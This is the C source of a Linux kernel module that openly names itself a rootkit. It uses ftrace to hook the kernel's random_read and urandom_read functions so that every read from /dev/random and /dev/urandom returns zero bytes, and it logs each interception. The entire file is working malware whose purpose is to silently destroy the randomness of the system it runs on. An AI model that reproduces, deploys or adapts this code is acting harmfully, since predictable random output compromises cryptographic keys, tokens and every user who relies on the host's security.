#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROBIE");
MODULE_DESCRIPTION("bamboozle char");
MODULE_VERSION("0.3");


static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
	int bytesRead, i;
	long error;
	char *kbuf =NULL;
	bytesRead = orig_random_read(file, buf, nbytes, ppos);
	printk(KERN_INFO "rootkit: intercepted read to /dev/random: %d bytes\n", bytesRead);
	kbuf = kzalloc(bytesRead, GFP_KERNEL);
	error = copy_from_user(kbuf, buf, bytesRead);
	if(error)
	{
		printk(KERN_INFO "rootkit: could not copy buf to kbuf\n");
		kfree(kbuf);
		return bytesRead;
	}
	for(i = 0; i < bytesRead; i++)
		kbuf[i]=0x00;
	error = copy_to_user(buf,kbuf,bytesRead);
	if(error)
		printk(KERN_INFO "rootkit: could not copy kbuf to buf\n");
	kfree(kbuf);
	printk(KERN_INFO "rootkit: POG, random is nolonger random\n");

	return bytesRead;
}

static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{

	int bytesRead, i;
	long error;
	char *kbuf =NULL;
	bytesRead = orig_urandom_read(file, buf, nbytes, ppos);
	printk(KERN_INFO "rootkit: intercepted read to /dev/urandom: %d bytes\n", bytesRead);
	kbuf = kzalloc(bytesRead, GFP_KERNEL);
	error = copy_from_user(kbuf, buf, bytesRead);
	if(error)
	{
		printk(KERN_INFO "rootkit: could not copy buf to kbuf\n");
		kfree(kbuf);
		return bytesRead;
	}
	for(i = 0; i < bytesRead; i++)
		kbuf[i]=0x00;
	error = copy_to_user(buf,kbuf,bytesRead);
	if(error)
		printk(KERN_INFO "rootkit: could not copy kbuf to buf\n");
	kfree(kbuf);
	printk(KERN_INFO "rootkit: POG, urandom is nolonger random\n");
	return bytesRead;
}
static struct ftrace_hook hooks[] = {
	HOOK("random_read", hook_random_read, &orig_random_read),
	HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
};

static int __init rootkit_init(void)
{
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;
	printk(KERN_INFO "rootkit: loaded\n");
	return 0;
}
static void __exit rootkit_exit(void)
{
	fh_remove_hooks(hooks,ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: unloaded\n");
}
module_init(rootkit_init);
module_exit(rootkit_exit);







